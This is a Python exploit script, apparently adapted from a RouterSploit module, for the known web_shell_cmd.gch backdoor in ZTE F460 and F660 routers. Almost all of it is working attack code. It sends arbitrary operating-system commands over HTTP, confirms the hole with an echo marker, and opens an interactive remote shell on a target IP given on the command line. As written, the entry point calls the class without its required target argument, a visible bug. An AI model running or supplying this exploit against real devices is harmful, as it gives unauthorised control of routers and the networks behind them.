target = ""
# rsf exploit module
# description: Exploits ZTE F460 and F660 backdoor vulnerability that allows executing commands on the operating system level.

import re
import requests

class Exploit:
    __info__ = {
        "name": "ZTE F460 & F660 Backdoor RCE",
        "description": "Exploits ZTE F460 and F660 backdoor vulnerability that allows executing commands on the operating system level.",
        "authors": (
            "Rapid7",  # vulnerability discovery
            "Marcin Bury <marcin[at]threat9.com>",  # routersploit module
        ),
        "references": (
            "https://community.rapid7.com/community/infosec/blog/2014/03/04/disclosure-r7-2013-18-zte-f460-and-zte-f660-webshellcmdgch-backdoor",
        ),
        "devices": (
            "ZTE F460",
            "ZTE F660",
        ),
    }

    def __init__(self, target, port=80):
        self.target = target
        self.port = port

    def run(self):
        if self.check():
            print("Target is vulnerable")
            print("Invoking command loop")
            self.shell()
        else:
            print("Exploit failed - target seems to be not vulnerable")

    def execute(self, cmd):
        data = {
            "IF_ACTION": "apply",
            "IF_ERRORSTR": "SUCC",
            "IF_ERRORPARAM": "SUCC",
            "IF_ERRORTYPE": "-1",
            "Cmd": cmd,
            "CmdAck": ""
        }

        response = requests.post(f"http://{self.target}:{self.port}/web_shell_cmd.gch", data=data)
        if response.status_code == 200:
            regexp = '<textarea cols="" rows="" id="Frm_CmdAck" class="textarea_1">(.*?)</textarea>'
            res = re.findall(regexp, response.text, re.DOTALL)
            if len(res):
                return res[0]
        return ""

    def check(self):
        marker = "randomtext"
        cmd = f"echo {marker}"
        response = self.execute(cmd)
        return marker in response

    def shell(self):
        while True:
            cmd = input("Enter command: ")
            if cmd == 'exit':
                break
            print(self.execute(cmd))




import sys

if __name__ == "__main__":
    print("Run script:", __file__)
    if len(sys.argv) < 2:
        print(f"Usage: python3 {sys.argv[0]} <target_ip>")
        sys.exit(1)

    target_ip = sys.argv[1]
    exploit = Exploit()
    exploit.target = target_ip
    exploit.run()
